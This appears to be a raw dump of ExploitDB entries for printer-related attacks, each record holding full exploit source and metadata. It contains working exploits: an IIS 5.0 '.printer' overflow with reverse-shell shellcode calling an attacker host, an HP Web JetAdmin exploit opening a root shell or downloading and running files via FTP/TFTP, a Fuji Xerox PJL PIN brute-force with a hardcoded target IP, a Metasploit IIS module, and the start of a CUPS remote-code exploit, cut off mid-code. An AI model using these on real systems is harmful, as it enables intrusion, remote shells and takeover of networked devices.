printf("usage: %s 0 <vicHost> <vicPort> <atckHost> <atckPort> [<ret 1-26>]\\nOr: %s 1 <vicHost> [<shellPort>] [<vicPort>] [<ret 1-26>]\\n",argv[0],argv[0]);\r\n        exit(1);\r\n        }\r\n        else if(atoi(argv[1])==1 && argc<3)\r\n        {\r\n        printf("usage: %s 0 <vicHost> <vicPort> <atckHost> <atckPort> [<ret 1-26>]\\nOr: %s 1 <vicHost> [<shellPort>] [<vicPort>] [<ret 1-26>]\\n",argv[0],argv[0]);\r\n        exit(1);\r\n        }\r\n        }\r\n        if(!atoi(argv[1]))\r\n        {\r\n        if(argc>6 && atoi(argv[6])<27 && atoi(argv[6])>-1)\r\n          *(unsigned long *)&overflow[358]=ret[atoi(argv[6])];\r\n        else\r\n          *(unsigned long *)&overflow[358]=ret[0];\r\n        memcpy(&send_buf,&request,strlen(request));\r\n        memcpy(&send_buf[strlen(request)],&revers_shell,strlen(revers_shell));\r\n        memcpy(&send_buf[strlen(request)+strlen(revers_shell)],&overflow,strlen(overflow));\r\n\r\n        printf("You need to you need to set up a netcat listener on the host you control.\\nEx: nc -l -p %s -vv\\n",argv[5]);\r\n\r\n        if ((ht = gethostbyname(argv[2])) == 0){\r\n                printf("%s",argv[2]);\r\n                exit(1);\r\n        }\r\n        sin.sin_port = htons(atoi(argv[3]));\r\n        a_port = htons(atoi(argv[5]));\r\n        a_port^=0x9595;\r\n\r\n        sin.sin_family = AF_INET;\r\n        sin.sin_addr = *((struct in_addr *)ht->h_addr);\r\n\r\n        if ((ht = gethostbyname(argv[4])) == 0){\r\n                printf("%s",argv[4]);\r\n                exit(1);\r\n        }\r\n\r\n        a_host = *((unsigned long *)ht->h_addr);\r\n        a_host^=0x95959595;\r\n\r\n        send_buf[441]= (a_port) & 0xff;\r\n        send_buf[442]= (a_port >> 8) & 0xff;\r\n\r\n        send_buf[446]= (a_host) & 0xff;\r\n        send_buf[447]= (a_host >> 8) & 0xff;\r\n        send_buf[448]= (a_host >> 16) & 0xff;\r\n        send_buf[449]= (a_host >> 24) & 0xff;\r\n        }\r\n        else if(atoi(argv[1])==1)\r\n        {\r\n        if(argc>3)\r\n           printf("Use Netcat to connect to %s:%s\\n", argv[2],argv[3]);\r\n        else\r\n           printf("Use Netcat to connect to %s:4444\\n", argv[2]);\r\n        if(argc>5 && atoi(argv[5])<27 && atoi(argv[5])>-1)\r\n          *(unsigned long *)&overflow[358]=ret[atoi(argv[5])];\r\n        else\r\n          *(unsigned long *)&overflow[358]=ret[0];\r\n\r\n        if(argc>3 && atoi(argv[3])>0)\r\n        {\r\n           lportl=atoi(argv[3]);\r\n           lportl=htons(lportl);\r\n           memcpy(&lport[1], &lportl, 2);\r\n           *(long*)lport = *(long*)lport ^ 0x9432BF80;\r\n           memcpy(&shell[279],&lport,4);\r\n        }\r\n        memcpy(&send_buf,&request,strlen(request));\r\n        memcpy(&send_buf[strlen(request)],&shell,strlen(shell));\r\n        memcpy(&send_buf[strlen(request)+strlen(shell)],&overflow,strlen(overflow));\r\n\r\n        if ((ht = gethostbyname(argv[2])) == 0){\r\n                printf("%s",argv[2]);\r\n                exit(1);\r\n        }\r\n        if(argc>4 && atoi(argv[4])>0)\r\n        {\r\n            sin.sin_port = htons(atoi(argv[4]));\r\n        }\r\n        else\r\n            sin.sin_port = htons(80);\r\n        sin.sin_family = AF_INET;\r\n        sin.sin_addr = *((struct in_addr *)ht->h_addr);\r\n        }\r\n        if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){\r\n                perror("socket");\r\n                exit(1);\r\n        }\r\n\r\n        printf("\\nconnecting... \\n");\r\n\r\n        if ((connect(s, (struct sockaddr *) &sin, sizeof(sin))) == -1){\r\n                perror("connect");\r\n                exit(1);\r\n        }\r\n\r\n        send(s, send_buf, strlen(send_buf),0);\r\n        sleep (1);\r\n        #ifdef _WIN32\r\n        closesocket(s);\r\n        #else\r\n        close(s);\r\n        #endif\r\n        if(!z)\r\n          printf("sent... \\nyou may need to send a carriage on your listener if the shell doesn\'t appear.\\nhave fun!\\n");\r\n        else\r\n          printf("sent...\\n");\r\n        exit(0);\r\n}', u'description': u"Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (2)", u'platform': u'windows', u'author': u'dark spyrit', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-05-01T00:00:00+00:00', u'_id': 20816, u'type': u'remote', u'port': 0}

CVE: []
Description: HP Web JetAdmin 6.5 - 'connectedNodes.ovpl' Remote Code Execution
{u'code': u'#!/usr/bin/perl \r\nuse IO::Socket;\r\n#\r\n# This is an exploit for HP Web JetAdmin, the printer management server from HP. \r\n# It is NOT about printers! The service usually runs on port 8000 on Windows, \r\n# Solaris or Linux boxes.\r\n#\r\n# Greetz: The Phenoelit People, c-base crew, EEyE (rock!), Halvar on the other\r\n#         side of the planet, Johnny, Andreas, Lisa, H D Moore, Nicolas\r\n#         Fishbach and all the others I forgot\r\n#\r\n\r\n\r\n$|=1;\r\n\r\ndie "Specify server name or IP\\n" unless ($host=shift);\r\n\r\n#\r\n# lala stuff \r\n# \r\nprint "Phenoelit HP Web JetAdmin 6.5 remote\\n".\r\n" Linux root and Windows NT/2000 Administrator exploit\\n".\r\n" by FX of Phenoelit\\n".\r\n" Research done at BlackHat Singapore 2002\\n\\n";\r\n\r\n#\r\n# Check version for the kiddies\r\n# \r\n$request="GET /plugins/hpjwja/help/about.hts HTTP/1.0\\r\\n\\r\\n";\r\n&doit();\r\n#\r\n# Get the path first\r\n#\r\n$rs=~/--\\ framework\\.ini\\ (.+)-->/;\r\n$hppath=$1;\r\nif ($hppath) { $hppath=~s/\\/doc\\/plugins\\/framework\\/framework.ini//; }\r\n# \r\n# Now get some more info\r\n#\r\n$rs=~s/[\\r\\n\\t]//g;\r\n$rs=~s/<\\/td><td\\ valign\\=\\"top\\"\\ nowrap>//g;\r\n$rs=~/JetAdmin\\ Version<\\/b>([^<]+)<\\/td>/;\r\n$version=$1;\r\n$rs=~/System\\ Version<\\/b>([^<]+)<\\/td>/;\r\n$system=$1;\r\ndie "It\'s not version 6.5 or version extraction failed\\n" unless ($version=~/6\\.5/);\r\ndie "Could not extract path\\n" unless ($hppath);\r\n#\r\n# Info 2 user\r\n#\r\nprint "HP Web JetAdmin Path: \\n\\t".$hppath."\\n";\r\nprint "HP Web JetAdmin Version: ".$version."\\n";\r\n\r\nif ($system=~/Linux/) {\r\nprintf "Host system identified as Linux ...\\n";\r\n#\r\n# Create file content and kick off inetd\r\n#\r\n$cont= \r\n"obj=Httpd:VarCacheSet(hacked,true);".\r\n    "Httpd:ExecuteFile(/usr/sbin/,inetd,".$hppath."/cache.ini)".\r\n"&__BrowserID=0%0a3000%20stream%20tcp%20nowait%20root%20/bin/bash%20bash%0a";\r\n\r\n$request = "POST /plugins/framework/script/content.hts HTTP/1.0\\r\\n".\r\n"Host: ".$host."\\r\\n".\r\n"Accept: text/html, text/plain, application/pdf, image/*, ".\r\n"image/jpeg, text/sgml, video/mpeg, image/jpeg, ".\r\n"image/tiff, image/x-rgb, image/png, image/x-xbitmap,".\r\n" image/x-xbm, image/gif, application/postscript, */*;q=0.01\\r\\n".\r\n"Accept-Language: en\\r\\n".\r\n"Pragma: no-cache\\r\\n".\r\n"Cache-Control: no-cache\\r\\n".\r\n"User-Agent: Phenoelit script\\r\\n".\r\n"Referer: http://www.phenoelit.de/\\r\\n".\r\n"Content-type: application/x-www-form-urlencoded\\r\\n".\r\n"Content-length: ".length($cont)."\\r\\n\\r\\n".\r\n$cont;\r\n\r\n&doit();\r\nprint "You should now connect to $host:3000 and enjoy your root shell\\n";\r\n\r\n} elsif ($system=~/WinNT/) {\r\n\r\nprint "Target system is Windows.\\n".\r\n" Do you want file upload via FTP [f] or TFTP [t]: ";\r\n$usersel=<STDIN>;\r\nif ($usersel=~/^f/i) {\r\nprint "FTP used ...\\n";\r\nprint "FTP Host: "; $ftph=<STDIN>; chomp($ftph);\r\nprint "FTP User: "; $ftpu=<STDIN>; chomp($ftpu);\r\nprint "FTP Pass: "; $ftpp=<STDIN>; chomp($ftpp);\r\nprint "FTP Path: "; $ftppath=<STDIN>; chomp($ftppath);\r\nprint "FTP File: "; $ftpfile=<STDIN>; chomp($ftpfile);\r\n\r\nprint "File ".$ftpfile." will be downloaded from ".$ftph.$ftppath."\\n".\r\n" with username ".$ftpu." and password ".$ftpp."\\n";\r\n\r\n$cont=\r\n"obj=".\r\n"Httpd:ExecuteFile(,cmd.exe,/c,echo,open ".$ftph.",>c:\\\\x.txt);".\r\n"Httpd:ExecuteFile(,cmd.exe,/c,echo,".$ftpu.">>c:\\\\x.txt);".\r\n"Httpd:ExecuteFile(,cmd.exe,/c,echo,".$ftpp.">>c:\\\\x.txt);".\r\n"Httpd:ExecuteFile(,cmd.exe,/c,echo,lcd c:\\\\,>>c:\\\\x.txt);".\r\n"Httpd:ExecuteFile(,cmd.exe,/c,echo,cd ".$ftppath.",>>c:\\\\x.txt);".\r\n"Httpd:ExecuteFile(,cmd.exe,/c,echo,bin,>>c:\\\\x.txt);".\r\n"Httpd:ExecuteFile(,cmd.exe,/c,echo,get ".$ftpfile.",>>c:\\\\x.txt);".\r\n"Httpd:ExecuteFile(,cmd.exe,/c,echo,quit,>>c:\\\\x.txt);".\r\n"Httpd:ExecuteFile(,ftp.exe,-s:c:\\\\x.txt);".\r\n"Httpd:ExecuteFile(c:\\\\,".$ftpfile.")";\r\n\r\n} elsif ($usersel=~/^t/) {\r\nprint "TFTP used ...\\n";\r\nprint "TFTP Host: "; $ftph=<STDIN>; chomp($ftph);\r\nprint "TFTP Path: "; $ftppath=<STDIN>; chomp($ftppath);\r\nprint "TFTP File: "; $ftpfile=<STDIN>; chomp($ftpfile);\r\n\r\n$ftppath.="/" unless ($ftppath=~/\\/$/);\r\n$cont=\r\n"obj=".\r\n"Httpd:ExecuteFile(,tftp.exe,-i,".$ftph.",GET,".\r\n$ftppath.$ftpfile.",c:\\\\".$ftpfile.");".\r\n"Httpd:ExecuteFile(c:\\\\,".$ftpfile.")";\r\n\r\n} else {\r\nprint "Wurstfinger ?\\n";\r\nexit 0;\r\n}\r\n\r\n$request = "POST /plugins/framework/script/content.hts HTTP/1.0\\r\\n".\r\n"Host: ".$host."\\r\\n".\r\n"Accept: text/html, text/plain, application/pdf, image/*, ".\r\n"image/jpeg, text/sgml, video/mpeg, image/jpeg, ".\r\n"image/tiff, image/x-rgb, image/png, image/x-xbitmap,".\r\n" image/x-xbm, image/gif, application/postscript, */*;q=0.01\\r\\n".\r\n"Accept-Language: en\\r\\n".\r\n"Pragma: no-cache\\r\\n".\r\n"Cache-Control: no-cache\\r\\n".\r\n"User-Agent: Phenoelit script\\r\\n".\r\n"Referer: http://www.phenoelit.de/\\r\\n".\r\n"Content-type: application/x-www-form-urlencoded\\r\\n".\r\n"Content-length: ".length($cont)."\\r\\n\\r\\n".\r\n$cont;\r\n\r\nprint "If everything works well, the specified file should be running\\n".\r\n" soon in SYSTEM context. Don\'t stop this script until your program\\n".\r\n" terminates. Enjoy the box.\\n";\r\n&doit();\r\n\r\n} else {\r\nprint "Host OS (".$system.") not supported by exploit - modify it\\n";\r\n}\r\n\r\nexit 0;\r\n\r\n\r\nsub doit {\r\n    $remote =\r\n      IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$host,PeerPort=>"8000",);\r\n    die "cannot connect to http daemon on $host\\n" unless($remote);\r\n    $remote->autoflush(1);\r\n    print $remote $request;\r\n\r\n    $rs="";\r\n    while ( $rline=<$remote> ) { \r\n$rs.=$rline;\r\n#print $rline;\r\n    }\r\n\r\n    close $remote;\r\n}\r\n\r\n# milw0rm.com [2004-04-28]', u'description': u"HP Web JetAdmin 6.5 - 'connectedNodes.ovpl' Remote Code Execution", u'platform': u'hardware', u'author': u'FX', u'cve': [], u'source': u'ExploitDB', u'date': u'2004-04-28T00:00:00+00:00', u'_id': 294, u'type': u'remote', u'port': 8000}

CVE: []
Description: FUJI XEROX DocuCentre-V 3065 Printer - Remote Command Execution
{u'code': u'# Exploit Title: FUJI XEROX DocuCentre-V 3065 Printer - Remote Command Execution\r\n# Date: 2018-09-05\r\n# Exploit Author: vr_system\r\n# Vendor Homepage: https://www.fujixerox.com.cn/\r\n# Software Link: https://www.fujixerox.com.cn/\r\n# Version: DocuCentre-IV,DocuCentre-VI,DocuCentre-V,ApeosPort-VI,ApeosPort-V\r\n# Tested on: DocuCentre-V 3065,ApeosPort-VI C3371,ApeosPort-V C4475,ApeosPort-V C3375,DocuCentre-VI C2271,ApeosPort-V C5576,DocuCentre-IV C2263,DocuCentre-V C2263,ApeosPort-V 5070\r\n# CVE : N/A\r\n \r\n#  POC\uff1aAbility to write files to the printer\r\n#!/usr/bin/env python\r\n# -*- coding: UTF-8 -*-\r\nimport socket\r\nimport time\r\nPJL_START = "\\033%-12345X@PJL "\r\nPJL_FINISH = "\\033%-12345X\\r\\n"\r\n\r\ndef Buildsocket(ip,port=9100):\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)  \r\n    sock.settimeout(5)\r\n    try:\r\n        sock.connect((ip, port))\r\n    except:\r\n        print "[!*]-ip-%s-can\'t connect--" % ip\r\n        return \'error\'\r\n    for i in range(500):\r\n        print"bypass pin:{0}".format(i)\r\n        PJL_INFO_ID = """JOB PASSWORD={0}\\r\\n""".format(i)\r\n        DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  \r\n        sock.send(DEVICEID)  \r\n        PJL_INFO_ID = """DEFAULT PASSWORD=0\\r\\n"""\r\n        DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  \r\n        sock.send(DEVICEID)  \r\n\r\n    PJL_INFO_ID = """DEFAULT CPLOCK=OFF\\r\\n"""\r\n    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  \r\n    sock.send(DEVICEID)  \r\n    PJL_INFO_ID = """DEFAULT DISKLOCK=OFF\\r\\n"""\r\n    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  \r\n    sock.send(DEVICEID)  \r\n\r\n    PJL_INFO_ID = """FSDOWNLOAD FORMAT:BINARY SIZE=4 NAME="0:/test4"\\r\\n"""\r\n    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  \r\n    sock.send(DEVICEID)  \r\n    try:\r\n        device = sock.recv(1024)\r\n    except:pass\r\n    PJL_INFO_ID = """FSUPLOAD NAME="0:/test4" OFFSET=0 SIZE=4\\r\\n"""\r\n    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  \r\n    sock.send(DEVICEID)  \r\n    try:\r\n        device = sock.recv(1024)\r\n    except:pass\r\n    finally:\r\n        sock.close()\r\n    print "OK"\r\n\r\nif __name__ == \'__main__\':\r\n    ip = "118.42.125.192"\r\n    Buildsocket(ip, port=9100)\r\n\r\n# POC\uff1aAbility to view files in the printer\r\n##!/usr/bin/env python\r\n# -*- coding: UTF-8 -*-\r\nimport socket\r\nPJL_START = "\\033%-12345X@PJL "\r\nPJL_FINISH = "\\033%-12345X\\r\\n"\r\n\r\ndef Buildsocket(ip, port=9100):\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) \r\n    sock.settimeout(5)\r\n    try:\r\n        sock.connect((ip, port))\r\n    except:\r\n        print "[!*]-ip-%s-can\'t connect--" % ip\r\n        return \'error\'\r\n    PJL_INFO_ID = """FSDIRLIST NAME="0:/" ENTRY=1 COUNT=65535"""\r\n    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH  \r\n    sock.send(DEVICEID)  \r\n    try:\r\n        device = sock.recv(1024)\r\n    except:pass\r\n    PJL_INFO_ID = """FSDIRLIST NAME="0:/" ENTRY=1"""\r\n    DEVICEID = PJL_START + PJL_INFO_ID + PJL_FINISH\r\n    sock.send(DEVICEID)  #\r\n    try:\r\n        device = sock.recv(1024)\r\n    except:\r\n        return \'No\'\r\n    print "[!*]-ip-%s-is-ok\\r\\ndeviceidis-%s" % (str(ip), device)\r\n    sock.close()\r\n    return \'OK\'\r\nif __name__ == \'__main__\':\r\n    Buildsocket("118.42.125.192", port=9100)', u'description': u'FUJI XEROX DocuCentre-V 3065 Printer - Remote Command Execution', u'platform': u'hardware', u'author': u'vr_system', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-09-05T00:00:00+00:00', u'_id': 45332, u'type': u'remote', u'port': 9100}

CVE: []
Description: HP JetDirect rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification
{u'code': u'/*\r\nsource: http://www.securityfocus.com/bid/2245/info\r\n\r\nCertain versions of HP JetDirect enabled printers provide a function (PJL command) that changes the LCD display on a printer over TCP/IP. Arbitrary strings can be sent to the LCD display by a remote user using this command. This represents more of a nuisance than a threat, although it is conceivable that the ability to modify the display could be used in some sort of "social engineering" scheme. \r\n*/\r\n\r\n/*\r\n   HP Printer Hack\r\n   12/8/97 sili@l0pht.com\r\n*/\r\n\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netdb.h>\r\n#include <netinet/in.h>\r\n#include <stdio.h>\r\n\r\n#define PORT 9100\r\n\r\nint main (int argc, char *argv[]) {\r\n\r\n  int sockfd,len,bytes_sent;   /* Sock FD */\r\n  struct hostent *host;   /* info from gethostbyname */\r\n  struct sockaddr_in dest_addr;   /* Host Address */\r\n  char line[100];\r\n\r\n  if (argc !=3) {\r\n    printf("HP Display Hack\\n--sili@l0pht.com 12/8/97\\n\\n%s printer \\"message\\"\\n",argv[0]);\r\n    printf("\\tMessage can be up to 16 characters long\\n");\r\n    exit(1);\r\n  }\r\n\r\n  if ( (host=gethostbyname(argv[1])) == NULL) {\r\n    perror("gethostbyname");\r\n    exit(1);\r\n  }\r\n\r\n  printf ("HP Display hack -- sili@l0pht.com\\n");\r\n  printf ("Hostname:   %s\\n", argv[1]);\r\n  printf ("Message: %s\\n",argv[2]);\r\n\r\n  /* Prepare dest_addr */\r\n  dest_addr.sin_family= host->h_addrtype;  /* AF_INET from gethostbyname */\r\n  dest_addr.sin_port= htons(PORT) ; /* PORT defined above */\r\n\r\n  /* Prepare dest_addr */\r\n  bcopy(host->h_addr, (char *) &dest_addr.sin_addr, host->h_length);\r\n\r\n  bzero(&(dest_addr.sin_zero), 8);  /* Take care of  sin_zero  ??? */\r\n\r\n\r\n  /* Get socket */\r\n/*  printf ("Grabbing socket....\\n"); */\r\n  if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {\r\n    perror("socket");\r\n    exit(1);\r\n  }\r\n\r\n  /* Connect !*/\r\n\r\n  printf ("Connecting....\\n");\r\n\r\n  if (connect(sockfd, (struct sockaddr *)&dest_addr,sizeof(dest_addr)) == -1){\r\n    perror("connect");\r\n    exit(1);}\r\n\r\n  /* Preparing JPL Command */\r\n\r\n  strcpy(line,"\\033%-12345X@PJL RDYMSG DISPLAY = \\"");\r\n  strncat(line,argv[2],16);\r\n  strcat(line,"\\"\\r\\n\\033%-12345X\\r\\n");\r\n\r\n  /* Sending data! */\r\n\r\n/*  printf ("Sending Data...%d\\n",strlen(line));*/\r\n/*  printf ("Line: %s\\n",line); */\r\n  bytes_sent=send(sockfd,line,strlen(line),0);\r\n\r\n  printf("Sent %d bytes\\n",bytes_sent);\r\n  close(sockfd);\r\n}', u'description': u'HP JetDirect rev. G.08.x/rev. H.08.x/x.08.x/J3111A - LCD Display Modification', u'platform': u'hardware', u'author': u'sili', u'cve': [], u'source': u'ExploitDB', u'date': u'1997-12-08T00:00:00+00:00', u'_id': 20565, u'type': u'remote', u'port': 0}

CVE: []
Description: Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (1)
{u'code': u'#source: http://www.securityfocus.com/bid/2674/info\r\n\r\n#Windows 2000 Internet printing ISAPI extension contains msw3prt.dll which handles user requests. Due to an unchecked buffer in msw3prt.dll, a maliciously crafted HTTP .printer request containing approx 420 bytes in the \'Host:\' field will allow the execution of arbitrary code. Typically a web server would stop responding in a buffer overflow condition; however, once Windows 2000 detects an unresponsive web server it automatically performs a restart. Therefore, the administrator will be unaware of this attack.\r\n\r\n#* If Web-based Printing has been configured in group policy, attempts to disable or unmap the affected extension via Internet Services Manager will be overridden by the group policy settings. \r\n\r\n#!/usr/bin/perl\r\n# Exploit By storm@stormdev.net\r\n# Tested with sucess against Win2k IIS 5.0 + SP1\r\n# Remote Buffer Overflow Test for Internet Printing Protocol \r\n# This code was written after eEye brought this issue in BugTraq.\r\n\r\n\r\nuse Socket;\r\n\r\n\r\nprint "-- IPP - IIS 5.0 Vulnerability Test By Storm --\\n\\n";\r\n\r\nif (not $ARGV[0]) {\r\n\tprint qq~\r\n \t\tUsage: webexplt.pl <host>\r\n\t~; \r\nexit;}\r\n\r\n\r\n$ip=$ARGV[0];\r\n\r\nprint "Sending Exploit Code to host: " . $ip . "\\n\\n";\r\nmy @results=sendexplt("GET /NULL.printer HTTP/1.0\\n" . "Host: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\n\\n");\r\nprint "Results:\\n";\r\n\r\nif (not @results) {\r\n\tprint "The Machine tested has the IPP Vulnerability!";\r\n}\r\nprint @results;\r\n\r\nsub sendexplt {\r\n        my ($pstr)=@_; \r\n\t$target= inet_aton($ip) || die("inet_aton problems");\r\n        socket(S,PF_INET,SOCK_STREAM,getprotobyname(\'tcp\')||0) ||\r\n                die("Socket problems\\n");\r\n        if(connect(S,pack "SnA4x8",2,80,$target)){\r\n                select(S);              \r\n\t\t$|=1;\r\n                print $pstr;            \r\n\t\tmy @in=<S>;\r\n   \t        select(STDOUT);\r\n\t        close(S);\r\n                return @in;\r\n        } else { die("Can\'t connect...\\n"); }\r\n}', u'description': u"Microsoft IIS 5.0 - '.printer' ISAPI Extension Buffer Overflow (1)", u'platform': u'windows', u'author': u'storm', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-05-01T00:00:00+00:00', u'_id': 20815, u'type': u'remote', u'port': 0}

CVE: []
Description: Microsoft IIS 5.0 - Printer Host Header Overflow (MS01-023) (Metasploit)
{u'code': u'##\r\n# $Id: ms01_023_printer.rb 9179 2010-04-30 08:40:19Z jduck $\r\n##\r\n\r\n##\r\n# This file is part of the Metasploit Framework and may be subject to\r\n# redistribution and commercial restrictions. Please see the Metasploit\r\n# Framework web site for more information on licensing and terms of use.\r\n# http://metasploit.com/framework/\r\n##\r\n\r\nrequire \'msf/core\'\r\n\r\nclass Metasploit3 < Msf::Exploit::Remote\r\n\tRank = GoodRanking\r\n\r\n\tinclude Msf::Exploit::Remote::Tcp\r\n\r\n\tdef initialize(info = {})\r\n\t\tsuper(update_info(info,\r\n\t\t\t\'Name\'           => \'Microsoft IIS 5.0 Printer Host Header Overflow\',\r\n\t\t\t\'Description\'    => %q{\r\n\t\t\t\t\tThis exploits a buffer overflow in the request processor of\r\n\t\t\t\tthe Internet Printing Protocol ISAPI module in IIS. This\r\n\t\t\t\tmodule works against Windows 2000 service pack 0 and 1. If\r\n\t\t\t\tthe service stops responding after a successful compromise,\r\n\t\t\t\trun the exploit a couple more times to completely kill the\r\n\t\t\t\thung process.\r\n\t\t\t},\r\n\t\t\t\'Author\'         => [ \'hdm\' ],\r\n\t\t\t\'License\'        => MSF_LICENSE,\r\n\t\t\t\'Version\'        => \'$Revision: 9179 $\',\r\n\t\t\t\'References\'     =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[ \'CVE\', \'2001-0241\'],\r\n\t\t\t\t\t[ \'OSVDB\', \'3323\'],\r\n\t\t\t\t\t[ \'BID\', \'2674\'],\r\n\t\t\t\t\t[ \'MSB\', \'MS01-023\'],\r\n\t\t\t\t\t[ \'URL\', \'http://seclists.org/lists/bugtraq/2001/May/0005.html\'],\r\n\t\t\t\t],\r\n\t\t\t\'Privileged\'     => false,\r\n\t\t\t\'Payload\'        =>\r\n\t\t\t\t{\r\n\t\t\t\t\t\'Space\'    => 900,\r\n\t\t\t\t\t\'BadChars\' => "\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c",\r\n\t\t\t\t\t\'StackAdjustment\' => -3500,\r\n\t\t\t\t},\r\n\t\t\t\'Targets\'        =>\r\n\t\t\t\t[\r\n\t\t\t\t\t[\r\n\t\t\t\t\t\t\'Windows 2000 English SP0-SP1\',\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\'Platform\' => \'win\',\r\n\t\t\t\t\t\t\t\'Ret\'      => 0x732c45f3,\r\n\t\t\t\t\t\t},\r\n\t\t\t\t\t],\r\n\t\t\t\t],\r\n\t\t\t\'Platform\'       => \'win\',\r\n\t\t\t\'DisclosureDate\' => \'May 1 2001\',\r\n\t\t\t\'DefaultTarget\' => 0))\r\n\r\n\t\tregister_options(\r\n\t\t\t[\r\n\t\t\t\tOpt::RPORT(80)\r\n\t\t\t], self.class)\r\n\tend\r\n\r\n\r\n\tdef check\r\n\t\tconnect\r\n\t\tsock.put("GET /NULL.printer HTTP/1.0\\r\\n\\r\\n")\r\n\t\tresp = sock.get_once\r\n\t\tdisconnect\r\n\r\n\t\tif !(resp and resp =~ /Error in web printer/)\r\n\t\t\treturn Exploit::CheckCode::Safe\r\n\t\tend\r\n\r\n\t\tconnect\r\n\t\tsock.put("GET /NULL.printer HTTP/1.0\\r\\nHost: #{"X"*257}\\r\\n\\r\\n")\r\n\t\tresp = sock.get_once\r\n\t\tdisconnect\r\n\r\n\t\tif (resp and resp =~ /locked out/)\r\n\t\t\tprint_status("The IUSER account is locked out, we can\'t check")\r\n\t\t\treturn Exploit::CheckCode::Detected\r\n\t\tend\r\n\r\n\t\tif (resp and resp.index("HTTP/1.1 500") >= 0)\r\n\t\t\treturn Exploit::CheckCode::Vulnerable\r\n\t\tend\r\n\r\n\t\treturn Exploit::CheckCode::Safe\r\n\tend\r\n\r\n\tdef exploit\r\n\t\tconnect\r\n\r\n\t\tbuf = make_nops(280)\r\n\t\tbuf[268, 4] = [target.ret].pack(\'V\')\r\n\r\n\t\t# payload is at: [ebx + 96] + 256 + 64\r\n\t\tbuf << "\\x8b\\x4b\\x60"        # mov ecx, [ebx + 96]\r\n\t\tbuf << "\\x80\\xc1\\x40"        # add cl, 64\r\n\t\tbuf << "\\x80\\xc5\\x01"        # add ch, 1\r\n\t\tbuf << "\\xff\\xe1"            # jmp ecx\r\n\r\n\t\tsock.put("GET http://#{buf}/NULL.printer?#{payload.encoded} HTTP/1.0\\r\\n\\r\\n")\r\n\r\n\t\thandler\r\n\t\tdisconnect\r\n\tend\r\n\r\nend', u'description': u'Microsoft IIS 5.0 - Printer Host Header Overflow (MS01-023) (Metasploit)', u'platform': u'windows', u'author': u'Metasploit', u'cve': [], u'source': u'ExploitDB', u'date': u'2010-04-30T00:00:00+00:00', u'_id': 16469, u'type': u'remote', u'port': 0}

CVE: [u'CVE-2015-1158']
Description: CUPS < 2.0.3 - Remote Command Execution
{u'code': u'#!/usr/bin/python\r\n# Exploit Title: CUPS Reference Count Over Decrement Remote Code Execution\r\n# Google Dork: n/a\r\n# Date: 2/2/17\r\n# Exploit Author: @0x00string\r\n# Vendor Homepage: cups.org\r\n# Software Link: https://github.com/apple/cups/releases/tag/release-2.0.2\r\n# Version: <2.0.3\r\n# Tested on: Ubuntu 14/15\r\n# CVE : CVE-2015-1158\r\nimport os, re, socket, random, time, getopt, sys\r\nfrom socket import *\r\nfrom struct import *\r\n\r\ndef banner():\r\n    print \'\'\'\r\n             lol ty google\r\n             0000000000000\r\n          0000000000000000000   00\r\n       00000000000000000000000000000\r\n      0000000000000000000000000000000\r\n    000000000             0000000000\r\n   00000000               0000000000\r\n  0000000                000000000000\r\n 0000000               000000000000000\r\n 000000              000000000  000000\r\n0000000            000000000     000000\r\n000000            000000000      000000\r\n000000          000000000        000000\r\n000000         00000000          000000\r\n000000       000000000           000000\r\n0000000    000000000            0000000\r\n 000000   000000000             000000\r\n 0000000000000000              0000000\r\n  0000000000000               0000000\r\n   00000000000              00000000\r\n   00000000000            000000000\r\n  0000000000000000000000000000000\r\n   00000000000000000000000000000\r\n     000  0000000000000000000\r\n             0000000000000\r\n              @0x00string\r\nhttps://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py\r\n\'\'\'\r\n\r\ndef usage ():\r\n    print   ("python script.py <args>\\n"\r\n            "   -h, --help:             Show this message\\n"\r\n            "   -a, --rhost:            Target IP address\\n"\r\n            "   -b, --rport:            Target IPP service port\\n"\r\n            "   -c, --lib               /path/to/payload.so\\n"\r\n            "   -f, --stomp-only        Only stomp the ACL (no postex)\\n"\r\n            "\\n"\r\n            "Examples:\\n"\r\n            "python script.py -a 10.10.10.10 -b 631 -f\\n"\r\n            "python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so\\n")\r\n    exit()\r\n\r\ndef pretty (t, m):\r\n        if (t is "+"):\r\n                print "\\x1b[32;1m[+]\\x1b[0m\\t" + m + 